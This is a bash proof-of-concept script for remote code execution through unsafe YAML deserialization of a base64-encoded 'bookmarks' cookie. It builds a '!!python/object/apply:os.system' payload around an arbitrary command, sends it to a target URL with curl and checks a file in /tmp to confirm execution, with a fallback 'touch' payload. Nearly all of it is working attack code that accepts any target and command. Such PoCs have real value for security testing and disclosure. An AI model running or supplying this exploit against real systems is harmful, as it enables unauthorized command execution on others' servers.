#!/bin/bash

# POC: Remote Code Execution via Unsafe YAML Deserialization in Bookmarks Cookie
# This script demonstrates RCE by injecting a malicious YAML payload in the bookmarks cookie
# Target: Application that deserializes bookmarks cookie with unsafe YAML loader

TARGET_URL="${1:-http://localhost:5000}"
COMMAND="${2:-whoami > /tmp/rce_output.txt}"

echo "[*] Remote Code Execution via Unsafe YAML Deserialization POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Command: $COMMAND"
echo ""

# Step 1: Create malicious YAML payload with Python object instantiation
# Using !!python/object/apply:os.system with command as args
YAML_PAYLOAD="- !!python/object/apply:os.system
  args: ['$COMMAND']"

echo "[*] Step 1: Crafting malicious YAML payload"
echo "$YAML_PAYLOAD"
echo ""

# Step 2: Base64 encode the payload (as expected by the application)
BASE64_PAYLOAD=$(echo -n "$YAML_PAYLOAD" | base64 -w 0)
echo "[*] Step 2: Base64 encoded payload"
echo "$BASE64_PAYLOAD"
echo ""

# Step 3: Send the crafted cookie to the application
echo "[*] Step 3: Sending malicious bookmarks cookie to application"
RESPONSE=$(curl -s -b "bookmarks=$BASE64_PAYLOAD" "$TARGET_URL/list")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Step 4: Verify command execution by checking for output file
echo "[*] Step 4: Verifying command execution"
if [ -f "/tmp/rce_output.txt" ]; then
    echo "[+] SUCCESS: Command executed!"
    echo "[+] Command output:"
    cat /tmp/rce_output.txt
    echo ""
    rm /tmp/rce_output.txt
else
    echo "[-] Command may not have executed (file not found)"
    echo "[-] Attempting alternative verification..."
    
    # Try alternative payload with touch to verify execution
    ALT_COMMAND="touch /tmp/yaml_rce_test_$$"
    ALT_YAML_PAYLOAD="- !!python/object/apply:os.system
  args: ['$ALT_COMMAND']"
    ALT_BASE64=$(echo -n "$ALT_YAML_PAYLOAD" | base64 -w 0)
    
    curl -s -b "bookmarks=$ALT_BASE64" "$TARGET_URL/list" > /dev/null
    
    if [ -f "/tmp/yaml_rce_test_$$" ]; then
        echo "[+] SUCCESS: Alternative verification successful - RCE confirmed"
        rm "/tmp/yaml_rce_test_$$"
    else
        echo "[-] Alternative verification failed"
    fi
fi

echo "[*] POC complete"